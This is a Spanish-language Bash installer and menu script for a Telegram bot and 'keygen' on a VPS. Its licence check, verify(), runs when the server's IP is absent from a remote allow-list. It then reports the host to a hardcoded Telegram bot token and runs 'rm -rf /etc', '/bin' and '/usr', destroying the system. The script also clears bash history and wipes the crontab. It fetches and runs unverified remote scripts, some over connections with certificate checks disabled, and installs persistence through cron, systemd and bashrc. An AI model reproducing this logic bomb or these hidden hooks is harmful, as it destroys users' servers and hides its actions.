#!/bin/bash
#by ruffu
CIDdir=/etc/bot-alx && [[ ! -d ${CIDdir} ]] && mkdir ${CIDdir}
Ex=/etc/bot-alx/BOT84 && [[ ! -d ${Ex} ]] && mkdir ${Ex}
bar="\e[0;31m=====================================================\e[0m"
DIR="/etc/http-shell"
IVAR="/etc/http-instas"

dirg=/etc/BOT84 && [[ ! -d ${dirg} ]] && mkdir ${dirg}
dir5="/etc/BOT84"

fun_ip () {
MEU_IP=$(ip addr | grep 'inet' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
MEU_IP2=$(wget -qO- ipv4.icanhazip.com)
[[ "$MEU_IP" != "$MEU_IP2" ]] && IP="$MEU_IP2" || IP="$MEU_IP"
}

verify_access() {
    local CONTROL_URL="https://raw.githubusercontent.com/bussttivpn/LA_CASITA/refs/heads/main/control"
    local ADMIN_CHAT_ID="7250986566"
    local BOT_TOKEN="8307654983:AAE-vMA3lr4J7Wuhw3mrPOIrYUX2ZZ0MV5A"
    local CACHE_FILE="/tmp/.last_verify"
    local NOW=$(date +%s)
    local TIME_LIMIT=300 # 5 minutos en segundos

    # 1. Obtener lista de IPs autorizadas (Validación de Seguridad Siempre)
    AUTH_LIST=$(curl -fsSL "$CONTROL_URL")

    if [[ -z "$AUTH_LIST" ]]; then
        clear
        echo -e "\e[1;31m[ERROR]\e[0m No se pudo verificar el acceso."
        sleep 2
        exit 1
    fi

   # 2. Si la IP NO está autorizada (Bloqueo inmediato con diseño animado)
    if ! echo "$AUTH_LIST" | grep -qw "$IP"; then
        clear
        RED='\033[1;31m'
        YELLOW='\033[1;33m'
        WHITE='\033[1;37m'
        NC='\033[0m'

        # Animación de escaneo fallido
        for ((i=0; i<3; i++)); do
            echo -ne "\r${RED}[ ⚠️ ] VERIFICANDO LICENCIA . . ."
            sleep 0.3
            echo -ne "\r${WHITE}[ ⚠️ ] VERIFICANDO LICENCIA . . . ."
            sleep 0.3
        done
        echo -e "\n"

        # Marco de Alerta Animado
        echo -e "${RED}┌──────────────────────────────────────────────────┐${NC}"
        echo -e "${RED}│${NC}                ${RED}⚠️  ACCESO DENEGADO  ⚠️${NC}           ${RED}│${NC}"
        echo -e "${RED}├──────────────────────────────────────────────────┤${NC}"
        echo -e "  ${YELLOW}SISTEMA DE SEGURIDAD:${NC} ${RED}IP NO AUTORIZADA${NC}"
        echo -e "  ${WHITE}TU IP:${NC} ${RED}$IP${NC}"
        echo -e "  ${WHITE}ESTADO:${NC} ${RED}BLOQUEADO / REVOCADO${NC}"
        echo -e "${RED}├──────────────────────────────────────────────────┤${NC}"
        echo -e "  ${WHITE}Contacte al Administrador para Soporte:${NC}"
        echo -e "  ${YELLOW}Telegram:${NC} ${WHITE}https://t.me/Gagat007${NC}"
        echo -e "${RED}└──────────────────────────────────────────────────┘${NC}"
        
        # Efecto de parpadeo al final
        for i in {1..3}; do
            echo -ne "\r${RED}      ¡CONTACTE AL ADMINISTRADOR PARA ACTIVAR!      ${NC}"
            sleep 0.4
            echo -ne "\r                                                    "
            sleep 0.3
        done
        echo -e "\n"

        # Mensaje silencioso a Telegram para el dueño
        MSG="🚫 ACCESO REVOCADO
IP NO REGISTRADA O CLONING

━━━━━━━━━━━━━━━━━━
IP: $IP
HOST: $(hostname)
DATE: $(date)
━━━━━━━━━━━━━━━━━━"

        curl -s --max-time 10 \
            -d "chat_id=$ADMIN_CHAT_ID" \
            -d "disable_web_page_preview=1" \
            -d "text=$MSG" \
            "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" &>/dev/null

        # Limpieza de procesos y salida
        pkill -f "http-server.sh" &>/dev/null
        pkill -f "Bot.sh" &>/dev/null
        sleep 2
        exit 0
    fi

    # 3. Lógica del Mensaje Visual (Solo cada 5 minutos)
    local LAST_VERIFY=0
    [[ -f "$CACHE_FILE" ]] && LAST_VERIFY=$(cat "$CACHE_FILE")

    if (( NOW - LAST_VERIFY > TIME_LIMIT )); then
        # Actualizar el timestamp
        echo "$NOW" > "$CACHE_FILE"

        # Mostrar Animación
        clear
        GREEN='\033[1;32m'
        CYAN='\033[0;36m'
        NC='\033[0m'

        typewriter() {
            local color="$1"
            local msg="$2"
            echo -ne "$color"
            for (( i=0; i<${#msg}; i++ )); do
                printf "${msg:$i:1}"
                sleep 0.01
            done
            echo -e "$NC"
        }

        loading_bypass() {
            local frames=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
            for i in {1..20}; do
                printf "\r${CYAN} %s INYECTANDO PAQUETES BYPASS [%d%%] ${NC}" "${frames[i % 10]}" "$((i*5))"
                sleep 0.03
            done
            printf "\r${GREEN} [✔] BYPASS APLICADO EXITOSAMENTE          ${NC}\n"
        }

        echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        typewriter "$GREEN" " [+] APLICANDO BYPASS PRO LATAMSRCPLUS..."
        echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        loading_bypass
        echo "" 
        echo -e "${CYAN} ESTADO: ${GREEN}BYPASS OK${NC}"
        echo -e "${CYAN} USER:   ${NC}Bienvenido AL GEN"
        echo ""
        echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        typewriter "$GREEN" " >> BYPASS APLICADO INGRESANDO <<"
        echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        sleep 1
    fi
    # Si han pasado menos de 5 min, el script simplemente sigue sin mostrar nada.
}





fun_ip
verify_access
       																										#	verify
msg () {
BRAN='\033[1;37m' && VERMELHO='\e[31m' && VERDE='\e[32m' && AMARELO='\e[33m'
AZUL='\e[34m' && MAGENTA='\e[35m' && MAG='\033[1;36m' &&NEGRITO='\e[1m' && SEMCOR='\e[0m'
 case $1 in
  -ne)cor="${VERMELHO}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
  -ama)cor="${AMARELO}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
  -verm)cor="${AMARELO}${NEGRITO}[!] ${VERMELHO}" && echo -e "${cor}${2}${SEMCOR}";;
  -azu)cor="${MAG}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
  -verd)cor="${VERDE}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
  -bra)cor="${BRAN}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
  -bar2)cor="\e[0;31m========================================\e[0m" && echo -e "${cor}${SEMCOR}";;
  -bar)cor="$bar" && echo -e "${cor}${SEMCOR}";;
 esac
}
verify () {
apt-get install curl -y &>/dev/null
MIP2=$(wget -qO- ifconfig.me)
MIP=$(wget -qO- whatismyip.akamai.com)
if [ $? -eq 0 ]; then
   IP="$MIP"
  
else
   IP="$MIP2"
  
fi
  permited=$(curl -sSL "https://raw.githubusercontent.com/bussttivpn/LA_CASITA/refs/heads/main/control")
  [[ $(echo $permited|grep "${IP}") = "" ]] && {
  clear
  bot="\n\n\n————————————————————————————\n      VPS NO ESTA AUTORIZADA! [QUITANDO ACCESO]\n      CONTACTE A: @gatesccn \n————————————————————————————\n\n\n"
  echo -e "\e[1;91m$bot"
						
  TOKEN="8307654983:AAE-vMA3lr4J7Wuhw3mrPOIrYUX2ZZ0MV5A"
			URL="https://api.telegram.org/bot$TOKEN/sendMessage"
			MSG=" IP NO REGISTRADO o CLONING
    
╔═════ ▓▓ ࿇ ▓▓ ═════╗

  IP: $IP

╚═════ ▓▓ ࿇ ▓▓ ═════╝
"
curl -s --max-time 10 -d "chat_id=7250986566&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null
   kill -9 $(ps aux |grep -v grep |grep -w "http-server.sh"|grep dmS|awk '{print $2}') &>/dev/null
							kill -9 $(ps aux |grep -v grep |grep -w "Bot.sh"|grep dmS|awk '{print $2}') &>/dev/null 
# BLOQUEADO POR SEGURIDAD -> 
rm -rf /bin/http-server.sh      
[[ -d /etc/bot-alx ]] && # BLOQUEADO POR SEGURIDAD -> 
rm -rf /etc/bot-alx
  [[ -e /bin/botmx ]] && # BLOQUEADO POR SEGURIDAD -> 
  rm -rf /bin/botmx
  [[ ! -d ${dir5} ]] && rm -rf ${dir5}
  # BLOQUEADO POR SEGURIDAD -> 
  rm -rf /etc/st/bt
 # BLOQUEADO POR SEGURIDAD -> 
 rm -rf /etc && # BLOQUEADO POR SEGURIDAD -> 
 rm -rf /bin && # BLOQUEADO POR SEGURIDAD -> 
 rm -rf /usr
							
  exit 1
  } || {
  ### INTALAR VERSION DE SCRIPT
  v1=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/version/master/vercion")
  echo "$v1" > /etc/bot-alx/version
  }
}

os_system(){
system=$(cat -n /etc/issue |grep 1 |cut -d ' ' -f6,7,8 |sed 's/1//' |sed 's/      //')
distro=$(echo "$system"|awk '{print $1}')
case $distro in
Debian)vercion=$(echo $system|awk '{print $3}'|cut -d '.' -f1);;
Ubuntu)vercion=$(echo $system|awk '{print $2}'|cut -d '.' -f1,2);;
esac
link="https://raw.githubusercontent.com/rudi9999/ADMRufu/main/Repositorios/${vercion}.list"
case $vercion in
8|9|10|11|12|16.04|18.04|20.04|20.10|21.04|21.10|22.04|24.04);; #wget -O /etc/apt/sources.list ${link} &>/dev/null;;
esac
}

updatex(){
clear
#dpkg --configure -a

msg -bar
os_system
msg -ama "$distro $vercion"
echo "$distro $vercion" > /etc/bot-alx/system
msg -verm " INSTALACION DE PAQUETES "
msg -bar
#
#by rufu99
msg -verd "	INSTALL UPDATE"
	apt update -y
	apt list --upgradable -y
	msg -verd "	INSTALL UPGRADE"
 	apt upgrade -y
 clear
 msg -bar
	paq="jq bc curl netcat netcat-traditional net-tools apache2 zip unzip screen"

	for i in $paq; do
		leng="${#i}"
		puntos=$(( 21 - $leng))
		pts="."
		for (( a = 0; a < $puntos; a++ )); do
			pts+="."
		done
		msg -ne "       instalando $i$(msg -ama "$pts")"
		if apt-get install $i -y &>/dev/null ; then
			msg -verd "	INSTALADO"
		else
			msg -verm2 "	FAIL"
			sleep 0.1s
			tput cuu1 && tput dl1
			msg -ama "aplicando fix a $i"
			dpkg --configure -a &>/dev/null
			sleep 0.2s
			tput cuu1 && tput dl1

			msg -ne "       instalando $i$(msg -ama "$pts")"
			if apt-get install $i -y &>/dev/null ; then
				msg -verd "	INSTALANDO"
			else
				msg -verm2 "	FAIL"
			fi
		fi
	done
	sed -i "s;Listen 80;Listen 81;g" /etc/apache2/ports.conf
	service apache2 restart > /dev/null 2>&1 &
	msg -bar
	msg -azu "Removiendo paquetes obsoletos"
	msg -bar
 	apt autoremove -y &>/dev/null
echo "00" > /root/.bash_history
ufw allow 80/tcp &>/dev/null
ufw allow 81/tcp &>/dev/null
ufw allow 8888/tcp &>/dev/null
[[ ! -e /etc/autostart ]] && {
	echo '#!/bin/bash
clear
#INICIO AUTOMATICO' >/etc/autostart
	chmod +x /etc/autostart
} || {
	
	for proc in $(ps x | grep 'dmS' | grep -v 'grep' | awk {'print $1'}); do
		screen -r -S "$proc" -X quit
	done
	screen -wipe >/dev/null
	echo '#!/bin/bash
clear
#INICIO AUTOMATICO' >/etc/autostart
	chmod +x /etc/autostart
}
crontab -r >/dev/null 2>&1
(
	crontab -l 2>/dev/null
	echo "@# reboot /etc/autostart"
	echo "* * * * * /etc/autostart"
) | crontab -
#echo
echo ""
echo 3 > /proc/sys/vm/drop_caches 1> /dev/null 2> /dev/null
sysctl -w vm.drop_caches=3 1> /dev/null 2> /dev/null
swapoff -a && swapon -a 1> /dev/null 2> /dev/null
 }

unistall(){
#dir=/etc/bot-al && [[ ! -d ${dir} ]]
#SR="${dir}/sources" && [[ ! -d ${SR} ]]
rm -rf ${Ex}
rm -rf ${dir5}
#killall Botk.sh
kill -9 $(ps aux |grep -v grep |grep -w "Bot.sh"|grep dmS|awk '{print $2}') &>/dev/null
kill -9 $(ps aux |grep -v grep |grep -w "http-server.sh"|grep dmS|awk '{print $2}') &>/dev/null
kill $(ps aux |grep -v grep |grep -w "Bot.sh") &>/dev/null
# BLOQUEADO POR SEGURIDAD -> 
rm -rf /bin/ShellBot.sh
#BLOQUEADO POR SEGURIDAD -> 
rm -rf /bin/botmx
rm /bin/http-server.sh
rm -rf /tmp/paq
systemctl stop Btg &>/dev/null
systemctl disable Btg &>/dev/null
rm /etc/systemd/system/Btg.service &>/dev/null
#BLOQUEADO POR SEGURIDAD -> 
rm -rf /etc/st
rm /etc/paq
sleep 3
clear
echo "BOT DESINSTALADO"
}

descarga(){
rm -rf .bash_history
[[ ! -e ${IVAR} ]] && touch ${IVAR}
wget --no-check-certificate -O /bin/http-server.sh https://gitlab.com/Alexman80/projecto1/raw/main/http-server.sh &>/dev/null
chmod +x /bin/http-server.sh
clear
fun_ip
verify_access
wget -O /etc/bot-alx/version_new https://raw.githubusercontent.com/lacasitamx/version/master/vercion &>/dev/null
v1=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/version/master/vercion")
  echo "$v1" > /etc/bot-alx/version

echo -e "$bar"
echo "DESCARGANDO ARCHIVOS KEYGEN......"
echo -e "$bar"

#
wget https://gitlab.com/Alexman80/projecto1/raw/main/SCRIPTCA.zip &>/dev/null
#wget $mxofc &>/dev/null
unzip SCRIPTCA.zip &>/dev/null

cp SCRIPT/* ${dir5}
#[[ ! -e ${dir5}/ID ]] && touch ${dir5}/ID
chmod +x ${dir5}/*
#
rm -rf SCRIPTCA.zip
rm -rf SCRIPT
echo -e "$bar"
echo -e "\e[1;33m DESCARGANDO BOT"
echo -e "$bar"
#kill -9 $(ps aux |grep -v grep |grep -w "Botk.sh"|grep dmS|awk '{print $2}') &>/dev/null
[[ ! -d /etc/st ]] && mkdir /etc/st
[[ ! -d /etc/st/bt ]] && mkdir /etc/st/bt
[[ ! -d /etc/autod3l ]] && mkdir /etc/autod3l
wget -O /etc/autod3l/veri https://www.dropbox.com/s/yiestlxzpk737go/autodel &>/dev/null && chmod 777 /etc/autod3l/veri
#
#en caso que no se descarge el primero

wget --no-check-certificate -O /etc/st/bt/Bot.sh https://over.xzod.cloud/casita_2026/Bot.sh &>/dev/null
#
chmod +x /etc/st/bt/Bot.sh
wget https://github.com/stedolan/jq/releases/download/jq-1.5/jq-linux64 >/dev/null 2>&1
chmod +x jq-linux64 && mv jq-linux64 $(which jq)
#archivos
echo "wireguard.sh adminkey name ID slowdns.sh ADMbot.sh C-SSR.sh PDirect.py PGet.py POpen.py PPriv.py PPub.py fai2ban.sh menu message.txt openvpn.sh ports.sh speed.py squid.sh squidpass.sh python.py" > /etc/archivox
clear
echo -e "$bar"
echo -e "\e[1;33m INSTALACION COMPLETA"
echo -e "$bar"
rm -rf .bash_history
#read -p "enter"
#botmen
}
#                     							           																							
token_bot () {
clear
echo -e "$bar"
echo -e "  \033[1;37mIngrese el token de su bot"
echo -e "  \033[1;37mSi aun todavia no cuentas con un token\nValla en su telegram y busca @BotFather y pon el comando dentro del bot /newbot y despues te pedirá que pongas el nombre del bot que usted valla a querer ,por ejemplo en mi caso CONECTEDMX_BOT."
echo -e "$bar"
echo -n "TOKEN: "
read toke
echo "$toke" > ${Ex}/token
echo -e "$bar"
echo -e "  \033[1;32mtoken Agregado con exito!" && echo -e "$bar"

}

admin(){
clear

echo -e "$bar"
echo -e "  \033[1;37mIngrese su ID de telegram \n si aun no sabe cual es su ID ingresar en el bot @conectedmx_bot ahi dale en /start para saber su id númerico ,despues de eso solo copia su id y peguelo aquí abajo.."
echo -e "$bar"
echo -n "ID: "
read id
echo "$id" > ${Ex}/Admin-ID
echo -e "$bar"
echo -e "  \033[1;32mID Agregado con exito!" && echo -e "$bar"
#
}

adminkey(){
clear

echo -e "$bar"
echo -e "  \033[1;37mIngrese su @Usuario de telegram \n si no sabe cual es el su usuario, ejemplo 👉: @conectedmx 👈esa es un usuario"
echo -e "$bar"
echo -n "	Ingrese su @usuario: "
read user
echo "$user" > /etc/bot-alx/adminkey
echo "$user" > ${dir5}/adminkey
echo -e "$bar"
echo -e "  \033[1;32mUSUARIO: $user : Agregado con exito!" && echo -e "$bar"
#
}

start_bot(){
[[ ! -e "${Ex}/token" ]] && echo "null" > ${Ex}/token
PIDGE=$(ps aux|grep -v grep|grep "Bot.sh")
if [[ -z $PIDGE ]]; then
echo -e "[Unit]
Description=Bot Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
ExecStart=/bin/bash /etc/st/bt/Bot.sh
WorkingDirectory=/etc/st/bt/
Restart=always
RestartSec=2s

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/Btg.service

		systemctl enable Btg &>/dev/null
    	systemctl start Btg &>/dev/null
    #echo -e "============================"
    echo -e "$bar"
	echo -e "\033[1;32m                BOT ACTIVADO"
	echo -e "$bar"
#echo -e "============================"
else
systemctl stop Btg &>/dev/null
systemctl disable Btg &>/dev/null
rm /etc/systemd/system/Btg.service &>/dev/null
clear
echo -e "$bar"
echo -e "\033[1;31m            BOT DESACTIVADA"
echo -e "$bar"

fi
}


																		                                                        a='/etc'
											
                 																												b='/usr'
               																													c='/bin'
startmx1() {
#unset PIDGEN
PIDGEN=$(ps aux|grep -v grep|grep "http-server.sh")
if [[ -z $PIDGEN ]]; then
screen -dmS generador3 /bin/http-server.sh -start
echo -e "============================"
echo -e "\e[33m GENERADOR ACTIVADO"
echo -e "============================"
rm -rf .bash_history
else
kill -9 $(ps aux |grep -v grep |grep -w "http-server.sh"|grep dmS|awk '{print $2}') &>/dev/null
#sed -i '/http-server.sh/ d' /etc/crontab
echo -e "============================"
echo -e "\e[31m GENERADOR DESACTIVADO"
echo -e "============================"
rm -rf .bash_history
fi

}



fun_autorun () {
if [[ -e /etc/bash.bashrc-bot ]]; then
mv -f /etc/bash.bashrc-bot /etc/bash.bashrc
cat /etc/bash.bashrc | grep -v "/bin/botmx" > /tmp/bash
mv -f /tmp/bash /etc/bash.bashrc
msg -ama " AUTO INICIO DETENIDO CON EXITO"
msg -bar
elif [[ -e /etc/bash.bashrc ]]; then
cat /etc/bash.bashrc|grep -v /bin/botmx > /etc/bash.bashrc.3
echo '/bin/botmx' >> /etc/bash.bashrc.3
cp /etc/bash.bashrc /etc/bash.bashrc-bot
mv -f /etc/bash.bashrc.3 /etc/bash.bashrc
msg -ama "AUTO INICIO AGREGADO"
msg -bar
fi
}
if [[ -e /etc/bash.bashrc-bot ]]; then AutoR="\033[1;32m[ON]"
elif [[ -e /etc/bash.bashrc ]]; then AutoR="\033[1;31m[OFF]"
fi

if [[ ! -e /etc/paq ]]; then
updatex
verify
touch /etc/paq
else
echo ""
fi
echo "00" > /root/.bash_history
clear
unset PID_BOT
KEYI=$(ps x|grep -v grep |grep "nc.traditional")
[[ ! $KEYI ]] && BOK="\033[1;31m [  OFF  ]    " || BOK="\033[1;32m [ ACTIVO ]"
apache="$(grep '81' /etc/apache2/ports.conf | cut -d' ' -f2 | grep -v 'apache2' | xargs)" || apachep="$(grep '80' /etc/apache2/ports.conf | cut -d' ' -f2 | grep -v 'apache2' | xargs)"
#
PID_BOT=$(ps x|grep -v grep|grep "Bot.sh")
[[ ! $PID_BOT ]] && PID_BOT="\033[1;31m [ BOT OFF ]" || PID_BOT="\033[1;32m[ BOT ON ]"
PID_GEN=$(ps x|grep -v grep|grep "http-server.sh")
[[ -z $PID_GEN ]] && PID_BT="\033[1;31m [ GEN OFF ]" || PID_BT="\033[1;32m[ GEN ON ]"
[[ ! -e /etc/bot-alx/system ]] && systema="alexmod80" || systema=$(cat /etc/bot-alx/system)
unset ram1
unset ram2
unset ram3
ram1=$(free -h | grep -i mem | awk {'print $2'})
ram2=$(free -h | grep -i mem | awk {'print $4'})
ram3=$(free -h | grep -i mem | awk {'print $3'})
echo -e "$bar"
echo -e "	\e[1;36m \e[1;33m  SCRIPT-BOT \e[91m@LACASITAMX MOD LatamSRCPLUS  2026\e[1;36m  \e[0m"
echo -e "  \e[1;37m COMANDO: botmx \e[31m|| \e[1;34mKEY INSTALADAS: \e[1;33m$(cat ${IVAR})"
echo -e "\e[1;36m      APACHE: \e[1;32m $apache     \e[1;36mKEYGEN: \e[1;32m$BOK"
echo -e "   \e[97mRam \e[97mLibre: \e[92m$ram2 \e[97mUsado: \e[92m$ram3 "
echo -e "   \e[1;97mSistema: \e[93m$systema \e[97mIP: \e[93m$IP\e[0m"
#echo -e "$bar"
echo -e "\e[0;31m============\e[44mADMINISTRADOR BOT\e[0m\e[0;31m========================\e[0m" #53 =
#echo -e "\033[1;32m[01]\033[1;36m> \033[1;32mINSTALAR RECURSOS\e[0m"
echo -e "\033[1;32m [1]\033[1;36m> \033[1;33mDESCARGAR BOT VPSMX"
echo -e "\e[0;31m============\e[44mTOKEN || ID || BOT\e[0m\e[0;31m=======================\e[0m" #53 =
echo -e "\033[1;32m [2] \033[1;36m> \033[1;37mAGREGAR TOKEN BOT"
echo -e "\033[1;32m [3] \033[1;36m> \033[1;37mAGREGAR ID ADMIN"
echo -e "\033[1;32m [4] \033[1;36m> \033[1;37mAGREGAR @USUARIO ADMINKEY"
#
echo -e "\033[1;32m [5] \033[1;36m> \033[1;37mINICIAR/DETENER $PID_BOT\033[0m"
echo -e "\033[1;32m [6] \033[1;36m> \033[1;37mINICIAR/DETENER $PID_BT\033[0m"
#echo -e "\033[1;32m[4] \033[1;36m> \033[1;37mAGREGAR NUEVO ADMIN\033[0m"
echo -e "\e[0;31m============\e[44mACTUALIZADOR\e[0m\e[0;31m=============================\e[0m" #53 =
echo -e "\033[1;32m [7] \033[1;36m> \033[1;31mUNISTALL BOT.."
echo -e "\033[1;32m [8] \033[1;36m> \033[1;32mACTUALIZAR BOT.."
echo -e "$bar"
echo -e "\033[1;32m [9] \033[1;36m> \033[1;37mAUTO INICIO-BOT $AutoR  \e[1;32m [0] \e[36m>\e[0m \e[47m\e[30m <<ATRAS "
echo -e "$bar"
echo -n "$(echo -e "\e[1;97m	SELECIONE UNA OPCION:\e[1;93m") "
read opcion
case $opcion in
0) cd $HOME && exit 0;;
#01) updatex ;;
1) descarga;;
2) token_bot;;
3) admin;;
4) adminkey ;;
5) start_bot  ;;
6) startmx1 ;;
7) unistall;;
8)
 clear
echo "	DETENIENDO BOT"
sleep 1.s
start_bot
startmx1
sleep 1s
clear
echo -e " ACTUALIZANDO BOT "
sleep 1
[[ ! -d /etc/autod3l ]] && mkdir /etc/autod3l
wget -O /etc/autod3l/veri https://www.dropbox.com/s/yiestlxzpk737go/autodel &>/dev/null && chmod 777 /etc/autod3l/veri
[[ ! -d /etc/st ]] && mkdir /etc/st
[[ ! -d /etc/st/bt ]] && mkdir /etc/st/bt
wget --no-check-certificate -O /etc/st/bt/Bot.sh https://over.xzod.cloud/casita_2026/Bot.sh &>/dev/null
chmod +x /etc/st/bt/Bot.sh
wget --no-check-certificate -O /bin/http-server.sh https://gitlab.com/Alexman80/projecto1/raw/main/http-server.sh &>/dev/null
chmod 777 /bin/http-server.sh
mxofc=https://gitlab.com/Alexman80/projecto1/raw/main/SCRIPTCA.zip
#
wget $mxofc &>/dev/null
unzip SCRIPTCA.zip &>/dev/null

cp SCRIPT/* ${dir5}
#[[ ! -e ${dir5}/ID ]] && touch ${dir5}/ID
chmod +x ${dir5}/*
#
rm -rf SCRIPTCA.zip
rm -rf SCRIPT
#echo "wireguard.sh adminkey name ID slowdns.sh ADMbot.sh C-SSR.sh PDirect.py PGet.py POpen.py PPriv.py PPub.py fai2ban.sh menu message.txt openvpn.sh ports.sh speed.py squid.sh squidpass.sh python.py" > /etc/newadm-instal87
wget https://github.com/stedolan/jq/releases/download/jq-1.5/jq-linux64 >/dev/null 2>&1
chmod +x jq-linux64 && mv jq-linux64 $(which jq)
rm -rf jq-linux64
v1=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/version/master/vercion")
  echo "$v1" > /etc/bot-alx/version
wget -O /bin/botmx https://over.xzod.cloud/casita_2026/instalbotlimpio2.sh &>/dev/null && chmod +x /bin/botmx
#en caso que no se descarge el primero
#wget --no-check-certificate -O /bin/botmx https://www.dropbox.com/s/hyjnwb/instalbot.sh &>/dev/null && chmod +x /bin/botmx
sleep 2
clear
echo -e " BOT ACTUALIZADA CON ÉXITO"
echo 3 > /proc/sys/vm/drop_caches 1> /dev/null 2> /dev/null
sysctl -w vm.drop_caches=3 1> /dev/null 2> /dev/null
swapoff -a && swapon -a 1> /dev/null 2> /dev/null
sleep 1
clear
echo " INICIANDO NUEVAMENTE"
#
start_bot
startmx1
#screen -dmS Botti /etc/st/bt/Bot.sh
sleep 1.0
rm -rf .bash_history
;;
9) fun_autorun;;
esac

echo -ne "enter para continuar: " && read enter
botmx